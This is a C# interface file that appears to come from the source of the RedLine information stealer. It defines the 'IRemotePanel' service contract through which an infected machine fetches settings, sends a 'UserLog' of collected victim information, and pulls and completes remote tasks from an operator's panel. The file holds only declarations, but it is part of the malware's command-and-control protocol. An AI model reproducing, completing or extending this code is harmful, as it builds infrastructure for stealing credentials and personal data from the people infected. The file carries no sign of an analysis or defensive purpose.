using System.Collections.Generic;
using System.ServiceModel;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Models.Core;

[ServiceContract(Name = "IRemotePanel")]
public interface IApiController
{
	[OperationContract(Name = "GetSettings")]
	ClientSettings GetSettings();

	[OperationContract(Name = "SendClientInfo")]
	void SendClientInfo(UserLog user);

	[OperationContract(Name = "GetTasks")]
	IList<RemoteTask> GetTasks(UserLog user);

	[OperationContract(Name = "CompleteTask")]
	void CompleteTask(UserLog user, int taskId);
}
